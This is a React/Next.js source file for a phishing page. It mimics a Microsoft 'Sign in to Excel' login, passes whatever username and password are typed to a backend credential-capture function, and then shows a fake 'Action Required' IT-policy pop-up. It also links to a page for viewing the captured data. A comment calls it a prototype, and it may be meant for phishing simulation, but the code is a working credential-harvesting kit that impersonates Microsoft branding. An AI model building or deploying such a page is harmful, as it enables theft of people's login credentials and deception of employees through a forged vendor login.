'use client';
import { FormEvent, useState } from 'react';
import { captureCredentials } from '@/ai/flows/capture-credentials';
import Link from 'next/link';

// Make Swal available in the component
declare const Swal: any;

export default function Home() {
  const imageUrl = "https://storage.googleapis.com/fsm-build-artefacts/PhishingSampleAnalysis10June-1.jpg";

  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = async (event: FormEvent) => {
    event.preventDefault();
    
    // Capture credentials on the backend
    await captureCredentials({ username, password });
    
    // Show SweetAlert2 prompt
    Swal.fire({
      title: "Action Required: Employee Asset Details",
      text: "Please review and update your asset information in accordance with the new IT policy.",
      icon: "info",
      confirmButtonText: "Update Now",
      confirmButtonColor: "#3085d6",
      background: "#fff",
      color: "#333"
    }).then(() => {
      // In a real scenario, you would redirect. For this prototype, we do nothing.
      console.log("Alert closed. Would redirect to employee-asset-update.html");
    });
  };
  
  return (
    <>
      {/* Blurred Image */}
      <img id="blurredImage" src={imageUrl} alt="Blurred screenshot" />

      {/* Login Overlay */}
      <div className="login-overlay" role="main" aria-label="Excel Login Screen">
        
        <h2>Sign in to Excel</h2>
        <form onSubmit={handleSubmit}>
          <input 
            type="text" 
            name="username" 
            placeholder="Email or phone" 
            autoComplete="username" 
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            required 
          />
          <input 
            type="password" 
            name="password" 
            placeholder="Password" 
            autoComplete="current-password" 
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required 
          />
          <button type="submit">Sign in</button>
          <small>© Microsoft Corporation</small>
        </form>
        <div style={{ marginTop: '20px' }}>
          <Link href="/data" style={{ color: '#217346', textDecoration: 'none' }}>
            View Captured Data
          </Link>
        </div>
      </div>
    </>
  );
}
